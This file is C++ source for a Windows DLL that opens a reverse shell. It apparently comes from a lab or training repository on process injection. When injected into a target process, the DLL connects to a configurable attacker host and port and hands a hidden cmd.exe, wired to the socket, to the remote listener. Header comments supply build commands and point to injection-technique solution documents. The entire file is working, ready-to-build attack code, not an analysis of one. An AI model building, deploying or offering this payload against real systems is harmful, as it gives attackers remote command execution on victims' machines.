// revshell_pure_dll.cpp — pure WinSock reverse shell DLL (no shellcode)
//
// When loaded into a target process (via LoadLibrary, CreateRemoteThread,
// APC, or reflective loader), spawns a reverse shell to LHOST:LPORT.
// cmd.exe appears as a child of the HOST process - very useful for proving
// code execution inside a specific target.
//
// Build (MSVC):
//   cl /LD /EHsc /O2 /nologo revshell_pure_dll.cpp /link ws2_32.lib /Fe:revshell_pure_dll.dll
//
// Build (MinGW-w64):
//   x86_64-w64-mingw32-g++ -shared -O2 -s -o revshell_pure_dll.dll revshell_pure_dll.cpp \
//       -lws2_32 -Wl,--subsystem,windows,--kill-at
//
// Use with any injection technique in docs/SOLUTIONS/13-*.md through 18-*.md.
//
// Change LHOST + LPORT below before building.

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#pragma comment(lib, "ws2_32.lib")

// ===========================================================================
// EDIT THESE TWO
// ===========================================================================
static const char* LHOST = "10.0.0.5";
static const int   LPORT = 4444;
// ===========================================================================

static DWORD WINAPI ReverseShellThread(LPVOID) {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 1;

    SOCKET s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, nullptr, 0, 0);
    if (s == INVALID_SOCKET) { WSACleanup(); return 2; }

    sockaddr_in sa = {};
    sa.sin_family = AF_INET;
    sa.sin_port   = htons((u_short)LPORT);
    inet_pton(AF_INET, LHOST, &sa.sin_addr);

    for (int i = 0; i < 10; ++i) {
        if (connect(s, (sockaddr*)&sa, sizeof(sa)) != SOCKET_ERROR) break;
        Sleep(2000);
    }

    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags    = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput  = (HANDLE)s;
    si.hStdOutput = (HANDLE)s;
    si.hStdError  = (HANDLE)s;

    PROCESS_INFORMATION pi = {};
    char cmd[] = "cmd.exe";
    if (CreateProcessA(nullptr, cmd, nullptr, nullptr, TRUE,
                       0, nullptr, nullptr, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }

    closesocket(s);
    WSACleanup();
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hMod, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hMod);
        CreateThread(nullptr, 0, ReverseShellThread, nullptr, 0, nullptr);
    }
    return TRUE;
}
